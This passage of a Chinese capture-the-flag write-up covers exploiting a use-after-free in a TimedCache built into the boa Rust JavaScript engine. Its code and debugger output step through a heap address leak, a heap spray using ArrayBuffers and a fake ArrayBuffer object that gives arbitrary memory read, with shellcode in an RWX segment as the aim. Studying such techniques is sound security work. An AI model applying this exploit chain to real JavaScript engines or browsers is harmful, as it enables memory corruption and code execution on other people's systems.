+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JsValue @0x75870461d090</span><br><span class="line">Object @0x7587046c08a8</span><br><span class="line">- Methods @0x758704609310</span><br><span class="line">- Array Buffer Data @0x7587046d8000</span><br></pre></td></tr></table></figure>
+<h3 id="b-leak-heap">b. leak heap</h3>
+<p>接下来要想想该如何泄露有用的地址出来。可以试着将 free 后堆块中的数据输出出来看看：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tools wrapper</span></span><br><span class="line"><span class="keyword">let</span> log = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123; <span class="built_in">console</span>.log(x) &#125;;</span><br><span class="line"><span class="keyword">let</span> debug = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123; log(<span class="built_in">console</span>.debug(x)) &#125;;</span><br><span class="line"><span class="keyword">let</span> gc = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.collectGarbage();</span><br><span class="line"><span class="keyword">let</span> bp = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.sysbreak();</span><br><span class="line"><span class="keyword">let</span> sleep = <span class="function">(<span class="params">x</span>) =&gt;</span> <span class="built_in">console</span>.sleep(x);</span><br><span class="line"><span class="keyword">let</span> hex = <span class="function">(<span class="params">x</span>) =&gt;</span> (<span class="string">"0x"</span> + x.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// parse</span></span><br><span class="line"><span class="comment">// let get_js_value = (obj) =&gt; </span></span><br><span class="line"><span class="comment">//     Number.parseInt(console.debug(obj).split("JsValue @")[1].split("\n")[0]);</span></span><br><span class="line"><span class="keyword">let</span> get_obj_addr = <span class="function">(<span class="params">obj</span>) =&gt;</span> </span><br><span class="line">    <span class="built_in">Number</span>.parseInt(<span class="built_in">console</span>.debug(obj).split(<span class="string">"Object @"</span>)[<span class="number">1</span>].split(<span class="string">"\n"</span>)[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">let</span> get_method_addr = <span class="function">(<span class="params">obj</span>) =&gt;</span> </span><br><span class="line">    <span class="built_in">Number</span>.parseInt(<span class="built_in">console</span>.debug(obj).split(<span class="string">"Methods @"</span>)[<span class="number">1</span>].split(<span class="string">"\n"</span>)[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">let</span> get_buffer_data_addr = <span class="function">(<span class="params">obj</span>) =&gt;</span> </span><br><span class="line">    <span class="built_in">Number</span>.parseInt(<span class="built_in">console</span>.debug(obj).split(<span class="string">"Buffer Data @"</span>)[<span class="number">1</span>].split(<span class="string">"\n"</span>)[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> spray_obj = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fake_timeout = &#123; valueOf() &#123;</span><br><span class="line">    log(<span class="string">"[+] fake_timeout called"</span>);</span><br><span class="line">    sleep(<span class="number">2000</span>);</span><br><span class="line">    gc();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> cache = <span class="keyword">new</span> TimedCache();</span><br><span class="line">cache.set(<span class="string">'key'</span>, <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">20</span>), <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">let</span> uaf_obj = cache.get(<span class="string">"key"</span>, fake_timeout);</span><br><span class="line"></span><br><span class="line">debug(uaf_obj);</span><br><span class="line">log(uaf_obj.length)</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; uaf_obj.length; ++i) &#123;</span><br><span class="line">    log(i + <span class="string">" =&gt; "</span> + uaf_obj[i]);</span><br><span class="line">&#125;</span><br><span class="line">bp();</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[+] fake_timeout called</span><br><span class="line">JsValue @<span class="number">0x72d3b041d090</span></span><br><span class="line">Object @<span class="number">0x72d3b04e7c28</span></span><br><span class="line">- Methods @<span class="number">0x72d3b0409460</span></span><br><span class="line"></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="number">0</span> =&gt; <span class="number">0</span></span><br><span class="line"><span class="number">1</span> =&gt; <span class="number">0</span></span><br><span class="line"><span class="number">2</span> =&gt; <span class="number">2957263088</span></span><br><span class="line"><span class="number">3</span> =&gt; <span class="number">29395</span></span><br><span class="line"><span class="number">4</span> =&gt; <span class="number">152870256</span></span><br><span class="line"><span class="number">5</span> =&gt; <span class="number">0</span></span><br><span class="line"><span class="number">6</span> =&gt; <span class="number">0</span></span><br><span class="line"><span class="number">7</span> =&gt; <span class="number">0</span></span><br><span class="line"><span class="number">8</span> =&gt; <span class="number">0</span></span><br><span class="line"><span class="number">9</span> =&gt; <span class="number">0</span></span><br><span class="line"><span class="number">10</span> =&gt; <span class="number">2957103232</span></span><br><span class="line"><span class="number">11</span> =&gt; <span class="number">29395</span></span><br><span class="line"><span class="number">12</span> =&gt; <span class="number">1</span></span><br><span class="line"><span class="number">13</span> =&gt; <span class="number">0</span></span><br><span class="line"><span class="number">14</span> =&gt; <span class="number">1</span></span><br><span class="line"><span class="number">15</span> =&gt; <span class="number">0</span></span><br><span class="line"><span class="number">16</span> =&gt; <span class="number">4282195719</span></span><br><span class="line"><span class="number">17</span> =&gt; <span class="number">32767</span></span><br><span class="line"><span class="number">18</span> =&gt; <span class="number">2957250560</span></span><br><span class="line"><span class="number">19</span> =&gt; <span class="number">29395</span></span><br></pre></td></tr></table></figure>
+<p>可以看到这里的输出有两种数对，每种数对中都有一大一小两个数，组合起来刚好为有效内存地址：</p>
+<ul>
+<li>
+<p><code>uaf_obj[3] * 0x100000000 + uaf_obj[2] == 0x72d3b04440f0</code>：</p>
+<p><img src="/2022/08/defcon30quals_constricted/image-20220827091210675.png" alt="image-20220827091210675"></p>
+<p>这块内存由 rust 自己来管理。在 exp 不变的情况下，这个地址相对于当前段的偏移，将大概在 <code>0x4440f0</code>左右。</p>
+</li>
+<li>
+<p><code>uaf_obj[17] * 0x100000000 + uaf_obj[16] == 0x7fffff3d1f07</code>，相对偏移 <code>0x1f07</code>：</p>
+<p><img src="/2022/08/defcon30quals_constricted/image-20220827092216977.png" alt="image-20220827092216977"></p>
+</li>
+</ul>
+<blockquote>
+<p>注意：set 进 TimedCache 的 Array 长度为 20，太长或太短都无法收集到有意义的指针。</p>
+</blockquote>
+<p>这样我们就能获取到这两个段的基地址；有意思的是，这两个段中间那个被夹着的段正是<strong>在执行 main 函数前通过 ctor 执行 mmap 操作</strong>所分配的内存，这块内存在每次重启程序后，长度都会发生变化（因为 getrandom）：</p>
+<blockquote>
+<p>注意程序会被调试多次，因此每张图中的地址不会一一对应（例如上图中的地址就无法映射至下图）。</p>
+</blockquote>
+<p><img src="/2022/08/defcon30quals_constricted/image-20220827095505733.png" alt="image-20220827095505733"></p>
+<p>这两个段中，地址较低、大小较大的段为 rust 管理的堆内存，上面存放着许多 rust 创建的对象，注意要和 heap 区分开。</p>
+<h3 id="c-spray">c. spray</h3>
+<p>堆喷时，需要让<strong>数组对象</strong>的 <strong>Backing store</strong>，分配至<strong>被释放 JsObject 的 Object 结构体内存空洞</strong>。这样一来，我们就可以通过数组对象来改写 UAF JsObject 的 Object 结构体数据，<strong>构造 fake object</strong>。</p>
+<p>在 JS 引擎漏洞利用中，通常会用 Typed Array + ArrayBuffer 类来占据被释放的内存。因为 boa 提供了针对 ArrayBuffer 的指针输出逻辑，而 BigUint64 有助于后续写入内存时<strong>以八字节为单位</strong>写入数据，这里我们选用 ArrayBuffer 来占内存，使用 BigUint64Array 来解释 ArrayBuffer。</p>
+<p>但这里有些问题需要解决，既然要去占有 UAF 对象，那么：</p>
+<ol>
+<li>UAF 对象大小该怎么确定？</li>
+<li>选什么作为 UAF 对象比较好？</li>
+</ol>
+<p>先说第一个问题。我们较难从 rust 代码中直接看出一个结构体的大小，同时也无法得知 rust 在分配堆内存时其 堆块 metadata 等内容的长度（甚至堆块有没有 metadata 也不知道），但我们可以通过<strong>重复创建相同类型的变量并打印其指针信息</strong>来判断。例如：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> spray_objs = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> obj = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>); <span class="comment">// alloc</span></span><br><span class="line">    debug(obj);  <span class="comment">// output</span></span><br><span class="line">    log(<span class="string">""</span>) <span class="comment">// new line</span></span><br><span class="line">    spray_objs.push(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据输出中多个 Object 指针之间的间隔：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">JsValue @0x729fbc61d260</span><br><span class="line">Object @0x729fbc6e8b28</span><br><span class="line">- Methods @0x729fbc609310</span><br><span class="line">- Array Buffer Data @0x729fbc61e800</span><br><span class="line"></span><br><span class="line">JsValue @0x729fbc61d2a0</span><br><span class="line">Object @0x729fbc6e8ca8</span><br><span class="line">- Methods @0x729fbc609310</span><br><span class="line">- Array Buffer Data @0x729fbc61e900</span><br><span class="line"></span><br><span class="line">JsValue @0x729fbc61d2e0</span><br><span class="line">Object @0x729fbc6e8e28</span><br><span class="line">- Methods @0x729fbc609310</span><br><span class="line">- Array Buffer Data @0x729fbc61ea00</span><br></pre></td></tr></table></figure>
+<p>可以得知 <code>ArrayBuffer</code> 类型的 JSObject，其 <code>Object</code> 结构所占用的内存大小（包括 chunk metadata，下同）为 0x180 字节（也就是下面这个结构体）</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span> &#123;</span><br><span class="line">    <span class="comment">/// The type of the object.</span></span><br><span class="line">    <span class="keyword">pub</span> data: ObjectData,</span><br><span class="line">    <span class="comment">/// The collection of properties contained in the object</span></span><br><span class="line">    properties: PropertyMap,</span><br><span class="line">    <span class="comment">/// Instance prototype `__proto__`.</span></span><br><span class="line">    prototype: JsPrototype,</span><br><span class="line">    <span class="comment">/// Whether it can have new properties added to it.</span></span><br><span class="line">    extensible: <span class="built_in">bool</span>,</span><br><span class="line">    <span class="comment">/// The `[[PrivateElements]]` internal slot.</span></span><br><span class="line">    private_elements: FxHashMap&lt;Sym, PrivateElement&gt;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那么这样一来就可以比较容易的得知某个 JS 类型的具体内存占用大小。</p>
+<p>现在来到第二个问题。由于在 Spray 阶段分配 ArrayBuffer 时，boa 会同时分配 ArrayBuffer object（大小 0x180 字节）和 Backing store（大小由用户指定，内存对齐），那么我们自然希望堆喷时 <strong>Backing store</strong> 可以占据 UAF memory，而不是被那个与 backing store 同时分配的 ArrayBuffer object 占据。这样一来，UAF object 的大小就不能是 0x180。</p>
+<p>构建一个非 0x180 大小的对象其实很简单，由于空对象 <code>{}</code>的 Object 结构体大小已经为 <code>0x180</code> 字节了，因此随意构建一个诸如 <code>{a:{}}</code> 这样的嵌套对象，其 Object 结构体长度就会变更为 <code>0x300</code>字节。结构越复杂的类，<code>Object</code> 结构体的大小就会越大。</p>
+<p>现在实战一下堆喷：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tools wrapper</span></span><br><span class="line"><span class="keyword">let</span> log = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123; <span class="built_in">console</span>.log(x) &#125;;</span><br><span class="line"><span class="keyword">let</span> debug = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123; log(<span class="built_in">console</span>.debug(x)) &#125;;</span><br><span class="line"><span class="keyword">let</span> gc = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.collectGarbage();</span><br><span class="line"><span class="keyword">let</span> bp = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.sysbreak();</span><br><span class="line"><span class="keyword">let</span> sleep = <span class="function">(<span class="params">x</span>) =&gt;</span> <span class="built_in">console</span>.sleep(x);</span><br><span class="line"><span class="keyword">let</span> hex = <span class="function">(<span class="params">x</span>) =&gt;</span> (<span class="string">"0x"</span> + x.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// parse tools</span></span><br><span class="line"><span class="comment">// let get_js_value = (obj) =&gt; </span></span><br><span class="line"><span class="comment">//     Number.parseInt(console.debug(obj).split("JsValue @")[1].split("\n")[0]);</span></span><br><span class="line"><span class="keyword">let</span> get_obj_addr = <span class="function">(<span class="params">obj</span>) =&gt;</span> </span><br><span class="line">    <span class="built_in">Number</span>.parseInt(<span class="built_in">console</span>.debug(obj).split(<span class="string">"Object @"</span>)[<span class="number">1</span>].split(<span class="string">"\n"</span>)[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">let</span> get_method_addr = <span class="function">(<span class="params">obj</span>) =&gt;</span> </span><br><span class="line">    <span class="built_in">Number</span>.parseInt(<span class="built_in">console</span>.debug(obj).split(<span class="string">"Methods @"</span>)[<span class="number">1</span>].split(<span class="string">"\n"</span>)[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">let</span> get_buffer_data_addr = <span class="function">(<span class="params">obj</span>) =&gt;</span> </span><br><span class="line">    <span class="built_in">Number</span>.parseInt(<span class="built_in">console</span>.debug(obj).split(<span class="string">"Buffer Data @"</span>)[<span class="number">1</span>].split(<span class="string">"\n"</span>)[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fake_timeout = &#123; valueOf() &#123;</span><br><span class="line">    log(<span class="string">"[+] fake_timeout called"</span>);</span><br><span class="line">    sleep(<span class="number">2000</span>);</span><br><span class="line">    gc();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> new_cache = <span class="keyword">new</span> TimedCache();</span><br><span class="line">new_cache.set(<span class="string">'spray'</span>, &#123;<span class="attr">a</span>:&#123;&#125;&#125;, <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">let</span> new_uaf_obj = new_cache.get(<span class="string">"spray"</span>, fake_timeout);</span><br><span class="line">debug(new_uaf_obj)</span><br><span class="line">log(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// let spray_obj = null;</span></span><br><span class="line"><span class="keyword">let</span> spray_objs = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> obj = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x300</span>);</span><br><span class="line">    debug(obj);</span><br><span class="line">    log(<span class="string">""</span>)</span><br><span class="line">    spray_objs.push(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bp();</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">JsValue @0x7a7ecde1d090</span><br><span class="line">Object @0x7a7ecdee7aa8      &#x2F;&#x2F; &lt;----- 1</span><br><span class="line">- Methods @0x7a7ecde09310</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JsValue @0x7a7ecde1d0e0</span><br><span class="line">Object @0x7a7ecdee7aa8      &#x2F;&#x2F; &lt;----- 2</span><br><span class="line">- Methods @0x7a7ecde09310</span><br><span class="line">- Array Buffer Data @0x7a7ecdec6000</span><br><span class="line"></span><br><span class="line">JsValue @0x7a7ecde1d120</span><br><span class="line">Object @0x7a7ecdee80a8</span><br><span class="line">- Methods @0x7a7ecde09310</span><br><span class="line">- Array Buffer Data @0x7a7ecdec6300</span><br><span class="line"></span><br><span class="line">JsValue @0x7a7ecde1d160</span><br><span class="line">Object @0x7a7ecdee8228</span><br><span class="line">- Methods @0x7a7ecde09310</span><br><span class="line">- Array Buffer Data @0x7a7ecdec6600</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>尬住了，内存空洞被 ArrayBuffer 的 Object 给占住了。粗略判断 rust 内存分配策略可能是 first-fit，分配 0x180 时发现有块 0x300 刚好可以切割，于是就分配走了。</p>
+<p>挣扎了一会，终于分配成功了：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">let</span> new_cache = new TimedCache();</span><br><span class="line">new_cache.set(<span class="symbol">'spray</span>', &#123;a:&#123;&#125;,b:&#123;&#125;&#125;, <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">let</span> new_uaf_obj = new_cache.get(<span class="string">"spray"</span>, fake_timeout);</span><br><span class="line">debug(new_uaf_obj)</span><br><span class="line">log(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> spray_objs = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> obj = new ArrayBuffer(<span class="number">0x180</span>);</span><br><span class="line">    debug(obj);</span><br><span class="line">    log(<span class="string">""</span>)</span><br><span class="line">    spray_objs.push(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">JsValue @0x73dcb281d0c0</span><br><span class="line">Object @0x73dcb28e8228     &lt;----- 1</span><br><span class="line">- Methods @0x73dcb2809310</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JsValue @0x73dcb281d0a0</span><br><span class="line">Object @0x73dcb28e83a8</span><br><span class="line">- Methods @0x73dcb2809310</span><br><span class="line">- Array Buffer Data @0x73dcb28e8200  &lt;----- 2</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>这次修改主要是把需要 set 进 TimedCache 的那个对象，从 <code>{a:{}}</code> 修改为 <code>{a:{}, b:{}}</code> ，这样一来 Object 结构体的大小就从 0x300 扩展至 0x480。在第一次分配 ArrayBuffer Object 对象时，内存管理器就<strong>不会立即</strong>从这块被释放的 0x480 上切割，而是获取其他位置的内存；等到第二次需要分配 0x180 大小的 Backing Store 时，再从这块内存空洞上切割一块下来，而 0x180 刚好是 Object 结构体的最低大小。</p>
+<p>测试一下是不是真的占据成功了。在 JS 代码后面加个 <code>debug(uaf_obj)</code> 看看此时的输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JsValue @0x701d8021d110</span><br><span class="line">Object @0x701d802f0228</span><br><span class="line">- Methods @0x0</span><br></pre></td></tr></table></figure>
+<p>ArrayBuffer 分配成功后会清除掉这上面的全部数据，因此此时 uaf_obj 的 Methods 地址变为了 nullptr，验证了堆喷的成功。</p>
+<h3 id="d-fake-obj">d. fake obj</h3>
+<p>现在我们已经占据了被释放的 Object 对象内存空洞。注意到 boa 上存在 RWX 段，我们可以试着将 shellcode 放置在此处并执行：</p>
+<p><img src="/2022/08/defcon30quals_constricted/image-20220827145033703.png" alt="image-20220827145033703"></p>
+<blockquote>
+<p>这个 RWX 段有些奇怪，在某些情况下是会没有 w 权限的，有些情况又会有。</p>
+<p>同时还某些条件下还可能存在两个 RWX 段，神奇。</p>
+</blockquote>
+<p>因此现在较为棘手的任务是<strong>构造任意地址读写原语</strong>。我们可以先为伪造的 obj 设置 method 指针，尝试构造一个 <strong>fake ArrayBuffer</strong>：</p>
+<blockquote>
+<p>通过调试与 debug 输出，可知 fake obj 其 method 指针的偏移量为 0x11 * 8 字节。</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x50</span>);</span><br><span class="line">views.setBigInt64(<span class="number">8</span> * <span class="number">0x11</span>, BigInt(get_method_addr(ab)), <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+<p>但如果只是这样，没有修改 Object 的枚举类型为 ArrayBuffer，那就会在使用这个 ArrayBuffer 时产生异常：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uncaught &quot;TypeError&quot;: &quot;buffer must be an ArrayBuffer&quot;</span><br></pre></td></tr></table></figure>
+<p>尝试去构造一个完整的 ArrayBuffer，但发现如果仅仅凭借着之前 leak 出来的堆地址，想要构造一个完整的 ArrayBuffer 几乎不可能，因为内部结构实在是太复杂了：</p>
+<p><img src="/2022/08/defcon30quals_constricted/image-20220827195903386.png" alt="image-20220827195903386"></p>
+<p>其中涉及到了堆、栈、二进制文件等地址，但目前能拿到的只有堆地址。需要再泄露出栈和二进制文件基地址才可以完成整个 fake obj 的构建。</p>
+<p>那要怎么泄露栈和二进制文件基地址呢？还是尝试新壶装旧酒，通过打印被 free 掉的堆块，来看看有没有什么有用的信息。有意思的是，随着 exp 的编写，<strong>原先那个只能 leak 两个堆指针的 leak 原语，突然间就又可以多 leak 出一个二进制文件基地址了</strong>：</p>
+<p><img src="/2022/08/defcon30quals_constricted/image-20220827171215486.png" alt="image-20220827171215486"></p>
+<p>这样一来，此时就有了<strong>两个堆的基地址</strong>和一个<strong>二进制文件的加载基地址</strong>，但是还是没有栈指针。不过发现这个程序是<strong>直接 panic</strong> 而不是 segment fault，说明那些 ArrayBuffer 中的指针完全没用上，不然就会触发非法指针解引用直接 crash 了。</p>
+<p>既然指针完全没用上，那么就尝试直接硬凑一些数据上去，看看是什么效果。首先要找到 <code>ObjectKind</code> 在 <code>ObjectData</code> 结构体中的相对偏移。通过调试器找到相对偏移量为0：</p>
+<p><img src="/2022/08/defcon30quals_constricted/image-20220827203907974.png" alt="image-20220827203907974"></p>
+<p>之后设置一些<strong>非指针数据</strong>（这些可能是枚举等）上去，并尝试任意地址读取：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. fake obj</span></span><br><span class="line"><span class="keyword">let</span> views = new DataView(spray_objs[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">// try to restore the data</span></span><br><span class="line"><span class="keyword">let</span> ab = new ArrayBuffer(<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">// ArrayBuffer ptr</span></span><br><span class="line"><span class="keyword">let</span> ptr = base_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">// Object Kind (ArrayBuffer)</span></span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x05</span>, <span class="number">0x02</span>n, <span class="literal">true</span>);        </span><br><span class="line"><span class="comment">// Target pointer</span></span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x06</span>, BigInt(ptr), <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// some size</span></span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x07</span>, <span class="number">0x100</span>n, <span class="literal">true</span>);</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x08</span>, <span class="number">0x100</span>n, <span class="literal">true</span>);</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x09</span>, <span class="number">0x100</span>n, <span class="literal">true</span>);</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x0a</span>, <span class="number">0x101</span>n, <span class="literal">true</span>);</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x11</span>, BigInt(get_method_addr(ab)), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">debug(ab);</span><br><span class="line">debug(new_uaf_obj)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> new_view = new DataView(new_uaf_obj);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; new_view.byteLength / <span class="number">8</span>; i++)</span><br><span class="line">    log(new_view.getBigUint64(<span class="number">8</span> * i).toString(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">bp();</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<p><img src="/2022/08/defcon30quals_constricted/image-20220827204926541.png" alt="image-20220827204926541"></p>
+<p>可以看到当前 fake object 已经被成功识别为 ArrayBuffer，同时从二进制文件基地址处读取到了 ELF 文件头。<strong>任意地址读取原语构造完成</strong>！</p>
